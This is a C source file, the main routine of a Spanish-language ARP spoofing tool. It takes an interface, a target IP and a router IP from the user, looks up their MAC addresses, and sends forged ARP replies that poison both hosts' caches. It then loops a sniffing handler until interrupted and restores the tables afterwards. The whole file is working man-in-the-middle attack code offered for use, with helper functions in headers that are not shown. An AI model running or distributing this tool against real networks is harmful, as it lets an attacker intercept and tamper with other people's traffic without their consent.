#include <arpa/inet.h>
#include <net/if.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

#include "functions.h"
#include "handle_sniff.h"

int main() {
  char *c1 = color(4);
  char *c2 = color(2);
  char *c3 = color(3);
  char *c4 = color(0);
  char *c5 = color(5);
  char *c6 = color(1);
  char *bg = background(6);

  char iface[IFNAMSIZ];
  char text_target_ip[16];
  char text_router_ip[16];
  uint32_t target_ip;
  uint32_t router_ip;
  printf("%sARP Spoofer (C) 2024 X-Leamsi%s\n\n", c1, color_reset);
  printf("[%sIface%s]: ", c2, color_reset);
  scanf("%15s", iface);
  printf("[%sTarget IP%s]: ", c2, color_reset);
  scanf("%15s", text_target_ip);
  printf("[%sRouter IP%s]: ", c2, color_reset);
  scanf("%15s", text_router_ip);

  struct in_addr addr;
  memset(&addr, 0x00, sizeof(addr));
  if (!inet_aton(text_target_ip, &addr)) {
    printf("[%sError en el inet_aton%s]: Error al convertir la direccion IP\n",
           color(2), color_reset);
    return EXIT_FAILURE;
  }
  target_ip = addr.s_addr;
  memset(&addr, 0x00, sizeof(addr));
  if (!inet_aton(text_router_ip, &addr)) {
    printf("[%sError en el inet_aton%s]: Error al convertir la direccion IP\n",
           color(2), color_reset);
    return EXIT_FAILURE;
  }
  router_ip = addr.s_addr;

  uint32_t local_ip;
  if (!get_local_ip(&local_ip, iface))
    return (free(c1), free(c2), free(c3), free(c4), free(c5), free(c6),
            free(bg), EXIT_FAILURE);
  uint8_t local_mac[6];
  if (!get_local_mac(local_mac, iface))
    return (free(c1), free(c2), free(c3), free(c4), free(c5), free(c6),
            free(bg), EXIT_FAILURE);

  printf(
      "\n\n(%s***%s) %sInicinado Ataque de Susplantacion de las tablas ARP%s\n",
      c1, color_reset, c3, color_reset);

  printf("\n(%s***%s) IP de esta maquina: %s%s%s%s; MAC de esta maquina: "
         "%s%s%s%s;\n",
         c1, color_reset, bg, c4, inet_ntoa(*(struct in_addr *)&local_ip),
         color_reset, bg, c4, mac_to_text(local_mac), color_reset);

  printf("\n(%s***%s) IP del Objetivo: %s%s%s%s; IP del Router: %s%s%s%s; "
         "Interfaz de Red: %s%s%s%s;\n",
         c1, color_reset, bg, c4, text_target_ip, color_reset, bg, c4,
         text_router_ip, color_reset, bg, c4, iface, color_reset);

  uint8_t target_mac[6];
  if (!get_mac(target_mac, local_mac, local_ip, target_ip, iface))
    return (free(c1), free(c2), free(c3), free(c4), free(c5), free(c6),
            free(bg), EXIT_FAILURE);
  uint8_t router_mac[6];
  if (!get_mac(router_mac, local_mac, local_ip, router_ip, iface))
    return (free(c1), free(c2), free(c3), free(c4), free(c5), free(c6),
            free(bg), EXIT_FAILURE);

  printf("\n(%s***%s) MAC del Objetivo: %s%s%s%s; MAC del Router: %s%s%s%s;\n",
         c1, color_reset, bg, c4, mac_to_text(target_mac), color_reset, bg, c4,
         mac_to_text(router_mac), color_reset);

  send_arp(local_mac, router_ip, target_mac, target_ip, iface);
  send_arp(local_mac, target_ip, router_mac, router_ip, iface);

  printf("\n\n(%s***%s) %sSusplantacion ARP iniciada%s\n", c5, color_reset, c6,
         color_reset);

  printf("Use [CTRL + C] para terminar ataque\n");
  while (1)
    wait_handle(iface, target_ip, target_mac, router_ip, router_mac);

  send_arp(router_mac, router_ip, target_mac, target_ip, iface);
  send_arp(target_mac, target_ip, router_mac, router_ip, iface);
  printf("\n(%s***%s) %sAtaque tarminado%s\n", c5, color_reset, c2,
         color_reset);
  return (free(c1), free(c2), free(c3), free(c4), free(c5), free(c6), free(bg),
          EXIT_SUCCESS);
}
